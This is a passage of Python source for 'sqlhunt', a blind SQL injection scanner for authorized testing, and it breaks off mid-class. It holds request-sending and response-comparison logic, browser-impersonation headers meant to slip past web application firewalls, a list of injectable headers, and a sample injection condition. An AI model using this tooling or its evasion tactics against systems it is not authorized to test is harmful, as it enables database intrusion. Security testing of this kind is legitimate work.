#!/usr/bin/env python3
"""
sqlhunt — blind SQL injection tester.

Blind only. Three families, tried in that order:
  * boolean-based  a TRUE condition renders like the baseline, a FALSE one does
                   not. Confirmed by a differential comparison, then re-verified
                   with a second, unrelated condition pair.
  * time-based     a conditional sleep delays the response. Confirmed against a
                   measured baseline and a zero-delay control, then repeated.
  * error-based    the FALSE branch is made to RAISE. For when the difference
                   exists but is too small for the similarity oracle to see -
                   one sentence inside a large constant page - and no delay
                   primitive is available. Proved against a control that shares
                   the same false condition but cannot raise, so the difference
                   is attributable to the error and nothing else.

No UNION, no stacked queries except where a delay has no other form (MSSQL),
and nothing that writes.

Proof of concept is deliberately limited to ONE short value, chosen with
--poc: the version banner (default), the current account, or the current
database. Any of the three proves the injection reaches the engine; which one
a report needs depends on what has to be demonstrated. The tool cannot be
pointed at table data: the three expressions are hardcoded per engine, there is
no flag to supply another, and nothing here writes.

For authorized testing only.
"""

from __future__ import annotations

import argparse
import collections
import concurrent.futures
import html
import os
import random
import re
import shlex
import statistics
import sys
import threading
import time
from dataclasses import dataclass, field
from datetime import datetime, timezone
from urllib.parse import (parse_qsl, quote, urlencode, urljoin, urlsplit,
                          urlunsplit)

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    sys.exit("[!] pip install requests")

VERSION = "1.10.0"
MAX_BODY = 3 * 1024 * 1024

# A real browser version string is complete: "Chrome/126.0" is not a version
# any browser has ever sent, and WAFs match that shape directly - the request
# is refused before the payload is looked at.
#
# Five mainstream identities, each carrying the headers that browser actually
# sends. They are whole profiles rather than a list of User-Agent strings
# because the rest of the request has to agree with the name on it: only
# Chromium sends sec-ch-ua, Firefox and Safari send none at all, and each has
# its own Accept. A Firefox User-Agent arriving with Chrome's client hints is a
# louder signal than no rotation at all. Same table as xsshunt.py.
CHROME_ACCEPT = ("text/html,application/xhtml+xml,application/xml;q=0.9,"
                 "image/avif,image/webp,image/apng,*/*;q=0.8,"
                 "application/signed-exchange;v=b3;q=0.7")
FIREFOX_ACCEPT = ("text/html,application/xhtml+xml,application/xml;q=0.9,"
                  "image/avif,image/webp,*/*;q=0.8")
SAFARI_ACCEPT = ("text/html,application/xhtml+xml,application/xml;q=0.9,"
                 "*/*;q=0.8")


def _chromium_hints(major: str, platform: str, edge: str = "") -> dict:
    brands = (f'"Chromium";v="{major}", "Microsoft Edge";v="{major}", '
              f'"Not?A_Brand";v="24"' if edge else
              f'"Chromium";v="{major}", "Google Chrome";v="{major}", '
              f'"Not?A_Brand";v="24"')
    return {"sec-ch-ua": brands, "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": f'"{platform}"'}


UA_PROFILES = [
    {"name": "Chrome 141 / Windows",
     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                   "AppleWebKit/537.36 (KHTML, like Gecko) "
                   "Chrome/141.0.7390.66 Safari/537.36",
     "Accept": CHROME_ACCEPT, "Accept-Language": "en-US,en;q=0.9",
     "hints": _chromium_hints("141", "Windows")},
    {"name": "Chrome 141 / macOS",
     "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
                   "AppleWebKit/537.36 (KHTML, like Gecko) "
                   "Chrome/141.0.7390.66 Safari/537.36",
     "Accept": CHROME_ACCEPT, "Accept-Language": "en-US,en;q=0.9",
     "hints": _chromium_hints("141", "macOS")},
    {"name": "Edge 141 / Windows",
     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                   "AppleWebKit/537.36 (KHTML, like Gecko) "
                   "Chrome/141.0.7390.66 Safari/537.36 Edg/141.0.3537.57",
     "Accept": CHROME_ACCEPT, "Accept-Language": "en-US,en;q=0.9",
     "hints": _chromium_hints("141", "Windows", edge="1")},
    {"name": "Firefox 143 / Windows",
     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:143.0) "
                   "Gecko/20100101 Firefox/143.0",
     "Accept": FIREFOX_ACCEPT, "Accept-Language": "en-US,en;q=0.5",
     "hints": {}},          # Gecko sends no client hints
    {"name": "Safari 18 / macOS",
     "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
                   "AppleWebKit/605.1.15 (KHTML, like Gecko) "
                   "Version/18.6 Safari/605.1.15",
     "Accept": SAFARI_ACCEPT, "Accept-Language": "en-US,en;q=0.9",
     "hints": {}},          # WebKit sends no client hints
]

DEFAULT_UA = UA_PROFILES[0]["User-Agent"]
UA = DEFAULT_UA             # kept for HEADER_BASE and anything reading it

# Sent by every one of the five on a navigation, http and https alike. Their
# absence is a tell in itself, so a request claiming to be a browser carries
# them whichever profile is in use.
FETCH_METADATA = {
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-User": "?1",
    "Upgrade-Insecure-Requests": "1",
}

CRIT, HIGH, MED, LOW, INFO = "CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"
_SEV_ORDER = {CRIT: 0, HIGH: 1, MED: 2, LOW: 3, INFO: 4}

# Value given to a parameter named with -p that does not exist on the target
# yet, so the payload still concatenates onto something the application may
# treat as a real lookup key rather than arriving as a bare quote.
GUESSED_PARAM_BASE = "1"

# Headers worth injecting into — frequently written straight into access logs,
# analytics tables and session/device records, which are exactly the writes that
# get built by string concatenation. Mirrors the list in xsshunt.py.
INJECTABLE_HEADERS = ["User-Agent", "Referer", "X-Forwarded-For", "X-Forwarded-Host",
                      "X-Real-IP", "Origin", "X-Requested-With", "X-Api-Version",
                      "True-Client-IP", "Client-IP", "X-Wap-Profile", "From"]

# Plausible starting values so a header payload appends to something realistic.
HEADER_BASE = {
    "User-Agent": UA,
    "Referer": "https://www.google.com/",
    "X-Forwarded-For": "203.0.113.7",
    "X-Real-IP": "203.0.113.7",
    "True-Client-IP": "203.0.113.7",
    "Client-IP": "203.0.113.7",
    "X-Forwarded-Host": "www.example.com",
    "Origin": "https://www.example.com",
    "X-Requested-With": "XMLHttpRequest",
    "X-Api-Version": "1",
    "X-Wap-Profile": "http://wap.example.com/uaprof.xml",
    "From": "scanner@example.com",
}

INERT_INPUT_TYPES = frozenset({"submit", "button", "image", "reset", "file"})

# A target must answer before we spend tests on it.
# Shortest fragment of a payload worth removing as an echo. Below this, a
# prefix is common text rather than the payload showing through.
MIN_ECHO = 12

PREFLIGHT_TRIES = 3
PREFLIGHT_BACKOFF = 1.0


# ----------------------------------------------------------------------------
# colour
# ----------------------------------------------------------------------------

ANSI = {
    CRIT: "\033[1;95m", HIGH: "\033[1;91m", MED: "\033[1;93m",
    LOW: "\033[1;96m", INFO: "\033[0;37m",
    "ok": "\033[1;92m", "warn": "\033[0;93m", "bad": "\033[0;91m",
    "dim": "\033[0;90m", "b": "\033[1m", "head": "\033[1;36m", "x": "\033[0m",
}
_COLOR = True


def set_color(enabled):
    global _COLOR
    _COLOR = enabled


def paint(s, key):
    return s if not _COLOR else f"{ANSI.get(key, '')}{s}{ANSI['x']}"


def status_key(code):
    try:
        code = int(code)
    except (TypeError, ValueError):
        return "dim"
    if code == 200:
        return "ok"
    if 300 <= code < 400:
        return "warn"
    if code in (401, 403):
        return "bad"
    return "dim"


# ----------------------------------------------------------------------------
# status
# ----------------------------------------------------------------------------

class Status:
    """
    Periodic status heartbeat for list mode (-l).

    Emitted on a timer from a daemon thread, so it fires at a steady wall-clock
    interval regardless of verbosity and regardless of how long any one host
    takes. Prints whole lines rather than redrawing in place: at -v 1 the output
    scrolls constantly, so an in-place indicator would be unreadable.

    Not used for a single target (-u) -- one host needs no queue accounting.
    """

    def __init__(self, console, total, interval=30.0, enabled=True):
        self.con = console
        self.total = total
        self.interval = interval
        self.enabled = enabled
        self.done = 0
        self.counts = {CRIT: 0, HIGH: 0, MED: 0, LOW: 0, INFO: 0}
        self._lk = threading.Lock()
        self._stop = threading.Event()
        self._thread = None
        self._t0 = 0.0

    def start(self):
        if not self.enabled:
            return
        self._t0 = time.time()
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()

    def _loop(self):
        # wait() returns True only when stop() is set, so a normal timeout emits
        while not self._stop.wait(self.interval):
            self.emit()

    def host_done(self, n=1):
        with self._lk:
            self.done += n

    def record(self, sev):
        with self._lk:
            if sev in self.counts:
                self.counts[sev] += 1

    def emit(self, label="status"):
        if not self.enabled:
            return
        with self._lk:
            done, c = self.done, dict(self.counts)
        remaining = max(0, self.total - done)
        el = int(time.time() - self._t0)
        self.con.line(paint(
            f"  [{label} {el // 60:02d}:{el % 60:02d}]  "
            f"tested {done}/{self.total}  remaining {remaining}  |  "
            f"crit {c[CRIT]}  high {c[HIGH]}  med {c[MED]}  "
            f"low {c[LOW]}  info {c[INFO]}", "head"))

    def stop(self):
        self._stop.set()
        if self._thread:
            self._thread.join(timeout=1)


# ----------------------------------------------------------------------------
# console
# ----------------------------------------------------------------------------

class Console:
    """v=0 prints confirmed findings only. v=1 every test. v=2 debug."""

    def __init__(self, level=0):
        self.level = level
        self._lk = threading.Lock()

    def line(self, msg):
        """One whole line, printed atomically — used by the Status heartbeat."""
        with self._lk:
            print(msg)
            sys.stdout.flush()

    def finding(self, f: "Finding"):
        with self._lk:
            print(f"\n{paint('['+f.sev+']', f.sev)} {paint(f.title, f.sev)}")
            print(f"  {paint('URL       :', 'head')} {f.url}")
            print(f"  {paint('Parameter :', 'head')} {f.param} ({f.location})")
            print(f"  {paint('Method    :', 'head')} {f.method}")
            print(f"  {paint('Technique :', 'head')} {f.technique}")
            if f.dbms:
                print(f"  {paint('DBMS      :', 'head')} {paint(f.dbms, 'b')}")
            if f.poc_value:
                lbl = {"banner": "Banner", "user": "DB user",
                       "db": "Database"}.get(f.poc_kind, "PoC value")
                print(f"  {paint(lbl + ' ' * (10 - len(lbl)) + ':', 'head')} "
                      f"{paint(f.poc_value, 'ok')}")
            if f.evidence:
                for ln in f.evidence.splitlines():
                    print(f"  {paint('Evidence  :', 'head')} {ln}"
                          if ln is f.evidence.splitlines()[0] else f"              {ln}")
            if f.payload:
                print(f"  {paint('Payload   :', 'head')} {paint(f.payload, 'warn')}")
            if f.poc:
                print(f"  {paint('PoC       :', 'head')} {f.poc}")
            sys.stdout.flush()

    def test(self, msg):
        if self.level >= 1:
            self.line(f"{paint('[test]', 'dim')} {msg}")

    def info(self, msg):
        if self.level >= 1:
            self.line(f"{paint('[info]', 'head')} {msg}")

    def debug(self, msg):
        if self.level >= 2:
            self.line(f"{paint('[dbg ]', 'dim')} {msg}")

    def warn(self, msg):
        if self.level >= 1:
            self.line(f"{paint('[warn]', 'warn')} {msg}")

    def auth(self, msg):
        """Always shown — a scan that silently runs unauthenticated looks
        exactly like one that found nothing."""
        self.line(f"{paint('[auth]', 'head')} {msg}")

    def skip(self, msg):
        """Always shown — the user needs to know a target went untested."""
        self.line(f"{paint('[skip]', 'warn')} {msg}")

    def error(self, msg):
        with self._lk:
            print(f"{paint('[err ]', 'bad')} {msg}", file=sys.stderr)
            sys.stderr.flush()

    def banner(self, msg):
        if self.level >= 1:
            self.line(f"\n{paint('=== ' + msg + ' ===', 'head')}")


# ----------------------------------------------------------------------------
# model
# ----------------------------------------------------------------------------

@dataclass
class Finding:
    title: str
    url: str
    param: str
    sev: str = HIGH
    location: str = "query"
    method: str = "GET"
    technique: str = ""
    dbms: str = ""
    poc_value: str = ""         # the one value read out, per --poc
    poc_kind: str = ""          # which of banner/user/db it actually is
    payload: str = ""
    evidence: str = ""
    poc: str = ""
    when: str = field(default_factory=lambda: datetime.now(timezone.utc).isoformat())


@dataclass
class Response:
    url: str
    status: int
    body: str
    elapsed: float
    headers: dict = field(default_factory=dict)
    cookies: dict = field(default_factory=dict)   # what THIS response set
    error: str = ""

    @property
    def ok(self) -> bool:
        return not self.error


@dataclass
class Point:
    """
    One place a payload can go.

    `base` is the value the injection point already carries -- the id, token or
    search term the application expects there. Every payload is CONCATENATED
    onto it, never substituted for it: replacing a valid id with a bare quote
    usually just produces "not found" and never reaches the vulnerable branch,
    whereas `12' AND (1=1)-- -` keeps the original lookup intact and only adds
    the condition. It also keeps the FALSE case meaningful, which is the entire
    basis of the boolean oracle.
    """
    url: str
    param: str
    method: str = "GET"
    data: dict | None = None
    header: str | None = None
    base: str = ""
    inject: str = ""            # where the payload goes: query | body | header
                                # | cookie (empty = infer from the fields)
    cookies: dict | None = None  # the whole jar, so the OTHER cookies stay
                                 # intact while one of them carries the payload

    @property
    def location(self) -> str:
        if self.header or self.inject == "header":
            return "header"
        if self.inject == "cookie":
            return "cookie"
        if self.inject == "query":
            return "query"
        if self.inject == "body":
            return "body"
        return "body" if self.method == "POST" else "query"

    @property
    def name(self) -> str:
        return self.header or self.param

    def current(self) -> str:
        """The real value a payload gets appended to."""
        return self.base


# ----------------------------------------------------------------------------
# http
# ----------------------------------------------------------------------------

def parse_cookie_header(value: str) -> dict:
    """Split a Cookie header into its individual cookies, order preserved."""
    jar = {}
    for part in (value or "").split(";"):
        part = part.strip()
        if not part or "=" not in part:
            continue
        k, _, v = part.partition("=")
        k = k.strip()
        if k:
            jar[k] = v.strip()
    return jar


def build_cookie_header(jar: dict) -> str:
    return "; ".join(f"{k}={v}" for k, v in jar.items())


# A name alone is ambiguous once cookies and headers are injection points too:
# "id" can be a query parameter, a body field and a cookie on the same request,
# and picking by name only would test whichever came first. The prefix says
# which one is meant; without it the name still matches anywhere, so the short
# form keeps working.
PARAM_KINDS = {
    "query": "query", "get": "query", "url": "query",
    "body": "body", "post": "body", "data": "body",
    "cookie": "cookie",
    "header": "header",
}


@dataclass(frozen=True)
class ParamSpec:
    """One name given to -p, with the place it has to be looked for."""
    kind: str                   # "" = anywhere | query | body | cookie | header
    name: str                   # as the user spelled it

    @property
    def key(self) -> str:
        return self.name.lower()

    def matches(self, pt: "Point") -> bool:
        if (pt.name or "").lower() != self.key:
            return False
        return not self.kind or pt.location == self.kind

    def __str__(self) -> str:
        return f"{self.kind}:{self.name}" if self.kind else self.name


def parse_param_specs(raw: str) -> list:
    """Parse -p: "id,cookie:TrackingId,header:User-Agent"."""
    out = []
    for item in (raw or "").split(","):
        item = item.strip()
        if not item:
            continue
        kind = ""
        head, sep, tail = item.partition(":")
        if sep and tail.strip():
            k = PARAM_KINDS.get(head.strip().lower())
            if k:
                kind, item = k, tail.strip()
        out.append(ParamSpec(kind, item))
    return out


def set_query_param(url: str, param: str, value: str) -> str:
    parts = urlsplit(url)
    qs = parse_qsl(parts.query, keep_blank_values=True)
    new, found = [], False
    for k, v in qs:
        if k == param:
            new.append((k, value))
            found = True
        else:
            new.append((k, v))
    if not found:
        new.append((param, value))
    return urlunsplit((parts.scheme, parts.netloc, parts.path,
                       urlencode(new, quote_via=quote), parts.fragment))


class AuthStore:
    """
    Per-host authentication headers, loaded once and consulted per request.

    Most of an application's surface sits behind a login, and until now the
    only way in was -H, which feeds ONE header dict shared by every target: in
    -l mode a session cookie given that way is sent to every host in the list,
    including third parties. Here the headers are keyed by (host, port) and
    resolved at request time, so they reach the host they belong to and no
    other.

    Files are named after the host they authenticate:

        www.example.com.txt        every port of that host
        www.example.com_8080.txt   that port only, and it wins over the above

    No implicit subdomain inheritance: a file for example.com does NOT
    authenticate app.example.com. Credentials that follow a wildcard end up on
    whatever subdomain happens to resolve, including one that has been taken
    over -- which is the sort of thing this suite exists to find.

    Content is the -H syntax, one header per line; '#' and blank lines are
    ignored and a line without a colon is reported rather than dropped in
    silence. Nothing here is limited to Cookie and Authorization: an Origin, an
    X-Api-Key or a tenant header belongs just as well.
    """

    def __init__(self):
        self.forced: dict = {}          # --auth-file: applies to every target
        self.by_key: dict = {}          # (host, port|None) -> headers
        self.loaded: list = []          # (path, scope) for the -v 1 listing

    # -- loading

    @staticmethod
    def _parse(path: str, con) -> dict:
        out = {}
        with open(path, "r", encoding="utf-8", errors="replace") as fh:
            for n, line in enumerate(fh, 1):
                line = line.strip().lstrip("﻿")
                if not line or line.startswith("#"):
                    continue
                if ":" not in line:
                    con.warn(f"{os.path.basename(path)}:{n}: no ':' — line "
                             f"ignored: {line[:60]}")
                    continue
                k, _, v = line.partition(":")
                if k.strip():
                    out[k.strip()] = v.strip()
        return out

    @staticmethod
    def _key_from_name(name: str):
        """www.example.com_8080.txt -> ('www.example.com', 8080)."""
        stem = name[:-4] if name.lower().endswith(".txt") else name
        host, sep, tail = stem.rpartition("_")
        if sep and host and tail.isdigit():
            return host.lower(), int(tail)
        return stem.lower(), None

    @classmethod
    def load(cls, auth_file, auth_dir, con):
        st = cls()
        if auth_file:
            if not os.path.isfile(auth_file):
                raise ValueError(f"no such auth file: {auth_file}")
            st.forced = cls._parse(auth_file, con)
            st.loaded.append((auth_file, "every target"))
        elif auth_dir:
            if not os.path.isdir(auth_dir):
                raise ValueError(f"no such auth directory: {auth_dir}")
            for name in sorted(os.listdir(auth_dir)):
                if name.startswith(".") or not name.lower().endswith(".txt"):
                    continue
                path = os.path.join(auth_dir, name)
                if not os.path.isfile(path):
                    continue
                host, port = cls._key_from_name(name)
                st.by_key[(host, port)] = cls._parse(path, con)
                st.loaded.append(
                    (path, host if port is None else f"{host}:{port}"))
        return st

    def __bool__(self):
        return bool(self.forced or self.by_key)

    def describe(self, con):
        if not self.loaded:
            return
        con.auth(f"{len(self.loaded)} auth file(s) loaded")
        for path, scope in self.loaded:
            con.info(f"  auth {os.path.basename(path)} -> {scope}")

    # -- resolution

    @staticmethod
    def _key(url: str):
        parts = urlsplit(url)
        host = (parts.hostname or "").lower()
        port = parts.port or (443 if parts.scheme == "https" else 80)
        return host, port

    def headers_for(self, url: str) -> dict:
        """The auth headers this URL gets, port-specific file winning."""
        if self.forced:
            return self.forced
        host, port = self._key(url)
        return (self.by_key.get((host, port))
                or self.by_key.get((host, None)) or {})

    def names_for(self, url: str) -> set:
        return {k.lower() for k in self.headers_for(url)}

    def cookies_for(self, url: str) -> set:
        """Cookie names supplied as credentials — never injected by default."""
        out = set()
        for k, v in self.headers_for(url).items():
            if k.lower() == "cookie":
                out |= set(parse_cookie_header(v))
        return out


class Http:
    """
    Per-thread session (requests.Session is not safe to share) and a global
    minimum gap between requests so --delay holds regardless of thread count.
    """

    @staticmethod
    def _as_dict(headers) -> dict:
        out = {}
        for h in headers or []:
            if ":" in h:
                k, _, v = h.partition(":")
                if k.strip():
                    out[k.strip()] = v.strip()
        return out

    def __init__(self, console, timeout=15.0, delay=0.0, proxy=None,
                 headers=None, verify=False, req_headers=None, auth=None):
        self.con = console
        self.timeout = timeout
        self.verify = verify
        self.auth = auth
        self.proxies = {"http": proxy, "https": proxy} if proxy else None
        # Sources, lowest priority first: what the target itself set, what the
        # captured request carried, what the auth file says for this host, -H.
        self.learned: dict = {}
        self.req_headers = self._as_dict(req_headers)
        self.cli_headers = self._as_dict(headers)
        self.base_headers = dict(FETCH_METADATA)
        self.base_headers.update(self._profile_headers(UA_PROFILES[0]))
        self.base_headers.update(self.req_headers)
        self.base_headers.update(self.cli_headers)
        self._explicit = {k.lower() for k in self.cli_headers}

        # Identity rotates per TARGET HOST, never per request: one client that
        # changes browser between two requests of the same session is a louder
        # signal than any single fixed User-Agent, and its cookies would follow
        # it across the change. Each host sees one coherent browser; the next
        # host sees a different one. The starting point is random so two runs
        # over the same list do not line up.
        self._profiles = list(UA_PROFILES)
        self._rotation = random.randrange(len(self._profiles))
        self._by_host: dict = {}
        self._host_lock = threading.Lock()

        self._min_gap = max(0.0, delay)
        self._next_slot = 0.0
        self._rate_lock = threading.Lock()
        self._count_lock = threading.Lock()
        self._local = threading.local()
        self.count = 0

    def _session(self):
        s = getattr(self._local, "s", None)
        if s is None:
            s = requests.Session()
            # deliberately NOT seeded with the identity headers: they depend on
            # the host and are computed per request in headers_for()
            self._local.s = s
        return s

    def _throttle(self):
        if self._min_gap <= 0:
            return
        with self._rate_lock:
            now = time.monotonic()
            wait = max(0.0, self._next_slot - now)
            self._next_slot = max(now, self._next_slot) + self._min_gap
        if wait:
            time.sleep(wait)

    @staticmethod
    def _profile_headers(profile: dict) -> dict:
        return {k: v for k, v in profile.items() if k not in ("name", "hints")}

    def profile_for(self, url: str) -> dict:
        """The browser identity this host is being scanned as."""
        host = (urlsplit(url).netloc or url).lower()
        with self._host_lock:
            prof = self._by_host.get(host)
            if prof is None:
                prof = self._profiles[self._rotation % len(self._profiles)]
                self._rotation += 1
                self._by_host[host] = prof
            return prof

    def headers_for(self, url: str) -> dict:
        """
        Every header this URL gets, resolved here rather than stored.

        A per-host table has to be CONSULTED per request, not written into a
        shared dict when a host starts: -l runs several hosts in parallel
        threads, and a mutation would hand one host another's session
        intermittently -- the very leak the table exists to prevent.

        Order, lowest first: defaults, cookies the target itself handed back,
        the captured request, the browser profile, the auth file, -H. Cookie is
        the exception: it is merged cookie by cookie along that same order, so
        a TrackingId carried by a -r capture survives a session= supplied by an
        auth file instead of being replaced wholesale by it.
        """
        auth = self.auth.headers_for(url) if self.auth else {}
        pinned = self._explicit | {k.lower() for k in auth}

        out = dict(FETCH_METADATA)
        out.update(self.learned)
        out.update(self.req_headers)

        profile = self.profile_for(url)
        prof = dict(self._profile_headers(profile))
        # Client hints go only to secure contexts, and only for the engines
        # that have them: putting Chromium's hints on a plain-http request, or
        # on a Firefox identity, is as anomalous as leaving them out of an
        # https one.
        if url.lower().startswith("https://"):
            prof.update(profile.get("hints") or {})
        for k, v in prof.items():
            if k.lower() not in pinned:
                out[k] = v

        out.update(auth)
        out.update(self.cli_headers)

        jar = {}
        for src in (self.learned, self.req_headers, auth, self.cli_headers):
            for k, v in src.items():
                if k.lower() == "cookie":
                    jar.update(parse_cookie_header(v))
        if jar:
            for k in [k for k in out if k.lower() == "cookie"]:
                del out[k]
            out["Cookie"] = build_cookie_header(jar)
        return out

    def header_for(self, url: str, name: str) -> str:
        """The value this URL currently carries for one header (append mode)."""
        want = name.lower()
        return next((v for k, v in self.headers_for(url).items()
                     if k.lower() == want), "")

    def send(self, url, method="GET", data=None, headers=None) -> Response:
        self._throttle()
        with self._count_lock:
            self.count += 1
        merged = self.headers_for(url)
        if headers:
            merged.update(headers)
        s = self._session()
        if any(k.lower() == "cookie" for k in merged):
            # requests rebuilds the Cookie header from its own jar and
            # OVERWRITES the one we set. A session that picked up a Set-Cookie
            # along the way would therefore silently replace the cookie under
            # test with the server's own.
            s.cookies.clear()
        started = time.monotonic()
        try:
            r = s.request(
                method, url, data=data, headers=merged, timeout=self.timeout,
                verify=self.verify, proxies=self.proxies,
                allow_redirects=False, stream=True)
            raw = r.raw.read(MAX_BODY, decode_content=True) or b""
            if not raw:
                # With stream=True AND allow_redirects=False, requests drains
                # and closes the stream of a 3xx itself (resolve_redirects
                # touches .content before yielding), so r.raw is already empty
                # and the body is sitting in .content. Without this, EVERY
                # redirect was compared as a zero-length page: enough to detect
                # a differential, not enough to recognise one, which is exactly
                # what a login form's success path is.
                try:
                    raw = (r.content or b"")[:MAX_BODY]
                except Exception:
                    raw = b""
            body = raw.decode(r.encoding or "utf-8", errors="replace")
            # r.cookies holds THIS response's Set-Cookie headers, already
            # split; dict(r.headers) would collapse several of them into one
            # comma-joined string that no longer parses.
            return Response(url, r.status_code, body, time.monotonic() - started,
                            dict(r.headers), dict(r.cookies))
        except requests.RequestException as e:
            return Response(url, 0, "", time.monotonic() - started,
                            error=str(e))


# ----------------------------------------------------------------------------
# response comparison
# ----------------------------------------------------------------------------

# Form fields carrying a per-render anti-CSRF or view-state token. Their value
# is re-issued on every response, so a page that contains one is never
# byte-identical to itself. Measured on a login form: two IDENTICAL requests
# compared at 0.848 — under the 0.95 a TRUE branch has to reach AND under the
# 0.85 a FALSE branch must stay below, which makes the page structurally
# undetectable. The value is blanked rather than the field removed, so the
# shape of the page survives.
_TOKEN_NAME = re.compile(
    r"^(?:[\w.\-]*(?:csrf|xsrf|nonce|authenticity|antiforgery)[\w.\-]*"
    r"|_token|__RequestVerificationToken|__VIEWSTATE[\w]*|__EVENTVALIDATION"
    r"|state|form_?key|form_?build_?id|form_?id)$", re.I)

_TAG_RX = re.compile(r"<(?:input|meta)\b[^>]*>", re.I)
_ATTR_RX = re.compile(r'([\w:.\-]+)\s*=\s*(?:"([^"]*)"|\'([^\']*)\'|([^\s"\'>]+))')


def _tag_attrs(tag: str) -> dict:
    return {k.lower(): (a or b or c or "")
            for k, a, b, c in _ATTR_RX.findall(tag)}


def blank_token_fields(body: str) -> str:
    """Blank the value of every <input>/<meta> whose name is a token field."""
    if "<" not in body:
        return body

    def one(m):
        tag = m.group(0)
        attrs = _tag_attrs(tag)
        if not _TOKEN_NAME.match(attrs.get("name", "")):
            return tag
        return _ATTR_RX.sub(
            lambda a: (a.group(1) + '=""'
                       if a.group(1).lower() in ("value", "content")
                       else a.group(0)),
            tag)
    return _TAG_RX.sub(one, body)


# Content that legitimately changes between two identical requests. Stripped
# before comparison so it cannot masquerade as a boolean difference.
_NOISE = [
    re.compile(r"\b\d{4}-\d{2}-\d{2}[T ]\d{2}:\d{2}(:\d{2})?\b"),   # timestamps
    re.compile(r"\b[0-9a-f]{32,64}\b", re.I),                        # hashes/tokens
    # key/value form, in JSON or in a query string. The name may carry a
    # suffix -- csrf_token, csrfmiddlewaretoken -- which the earlier version of
    # this pattern stopped short of, so the token it was written for went
    # straight through.
    re.compile(r'\b(?:csrf|xsrf|nonce|token|authenticity|sid|session)[\w.\-]*'
               r'["\']?\s*[:=]\s*["\']?[\w.\-~+/=]+', re.I),
    re.compile(r"\b\d{10,13}\b"),                                    # epoch stamps
    re.compile(r"\s+"),
]


def normalize(body: str) -> str:
    # Entities are decoded FIRST so that an echoed payload can be recognised
    # whatever spelling the application used for it. Escaping is not one form
    # but several -- &#39; &#x27; &apos; for a single quote alone -- and
    # strip_echo used to guess which. Measured on a filter page that echoes the
    # category: the quote came back as &#39;, html.escape() produces &#x27;,
    # the echo was never removed, and the length it added to one branch was
    # read as a database error.
    out = html.unescape(blank_token_fields(body))
    for rx in _NOISE[:-1]:
        out = rx.sub("", out)
    return _NOISE[-1].sub(" ", out).strip()


def shingles(text: str, k: int = 5) -> set:
    """
    Overlapping word n-grams. Jaccard over these behaves like a similarity
    ratio but is linear, where difflib on a multi-megabyte body is not.

    Anchored to the text's own words rather than to absolute offsets. A
    fixed-width character window is not: deleting 67 bytes near the top of a
    page shifts every later window out of phase and none of them match any
    more, while the same 67 bytes deleted at the bottom shift nothing.
    Measured on one page carrying one conditional line, moved and nothing
    else: similarity 0.202 with the line near the top, 0.939 with it in the
    footer. The same difference read two ways makes any threshold on it
    meaningless -- one position looks like a different page, the other like
    the same one.
    """
    words = text.split(" ")
    if len(words) <= k:
        return {text}
    return {" ".join(words[i:i + k]) for i in range(len(words) - k + 1)}


def strip_echo(body_norm: str, sent: str) -> str:
    """
    Remove the payload's own text from a normalised response before comparing.

    A page that echoes the value back — a search box refilled with what you
    typed, a debug banner printing the query it ran — otherwise differs for the
    trivial reason that the two payloads differ, which is not what any of these
    oracles is asking about. Measured on bWAPP's login page, which prints the
    whole SELECT: two equally long false conditions produced two byte-different
    responses and the error oracle declined a page it should have flagged.

    normalize() has already decoded entities on both sides, so the raw form is
    what an HTML echo looks like by the time it gets here. The percent-encoded
    form is still needed: a page that rebuilds its own links puts the payload
    back in a query string rather than in text.
    """
    s = normalize(sent)
    if not s:
        return body_norm
    for form in (s, quote(s), quote(s, safe=""), quote(s).replace("%20", "+")):
        if form:
            body_norm = body_norm.replace(form, "")

    # A page may show only PART of what was sent. A verbose SQL error quotes
    # the failing query truncated at a fixed width, so what lands in the body
    # is a prefix of the payload and removing the whole string matches
    # nothing: two controls carrying different conditions then differ by their
    # echo alone, which reads as "the page is dynamic" and disqualifies an
    # oracle that was working. Prefix presence is monotone, so the longest one
    # is a binary search.
    for cut in (lambda n: s[:n], lambda n: s[-n:]):
        lo, hi = MIN_ECHO, len(s)
        best = 0
        while lo <= hi:
            mid = (lo + hi) // 2
            if cut(mid) in body_norm:
                best, lo = mid, mid + 1
            else:
                hi = mid - 1
        if best >= MIN_ECHO:
            body_norm = body_norm.replace(cut(best), "")
    return body_norm


def similarity(a: str, b: str) -> float:
    """0.0 (nothing in common) .. 1.0 (identical after normalisation)."""
    if a == b:
        return 1.0
    sa, sb = shingles(a), shingles(b)
    if not sa or not sb:
        return 1.0 if sa == sb else 0.0
    inter = len(sa & sb)
    return inter / float(len(sa | sb))


# Masking the KNOWN token shapes above is not enough on its own: a page can
# carry a request id, a rotating asset hash or a per-render widget key under
# any name at all. Rather than grow the pattern list forever, ask the page
# what it changes by itself -- send the same request twice more and keep only
# what stayed put.
MAX_VOLATILE_RATIO = 0.25       # above this the page is dynamic, not noisy


class PageNoise:
    """
    What a page changes on its own, learned from repeated identical requests.

    Every oracle in this tool rests on "same request, same page". That premise
    is not free: a login form that re-issues its anti-CSRF token scores 0.848
    against itself, which puts a TRUE branch under the threshold it has to
    clear and a FALSE branch under the one it has to stay above -- so the page
    reads as clean whatever is injected into it. Calibration turns that
    premise into a measurement: the words that differ across two identical
    responses carry no information by construction, and are dropped from every
    later comparison.

    Uncalibrated, this is the identity function: nothing changes for a target
    that was already deterministic.
    """

    def __init__(self):
        self.words: frozenset = frozenset()
        self.raw_sim: float = 1.0       # self-similarity before masking
        self.self_sim: float = 1.0      # self-similarity after masking
        self.calibrated: bool = False
        self.too_dynamic: bool = False

    def apply(self, norm_text: str) -> str:
        if not self.words:
            return norm_text
        return " ".join(w for w in norm_text.split(" ") if w not in self.words)

    @staticmethod
    def _pairs(items):
        return [(items[i], items[j])
                for i in range(len(items)) for j in range(i + 1, len(items))]

    def learn(self, bodies: list) -> None:
        """Calibrate from >=2 responses to the SAME request."""
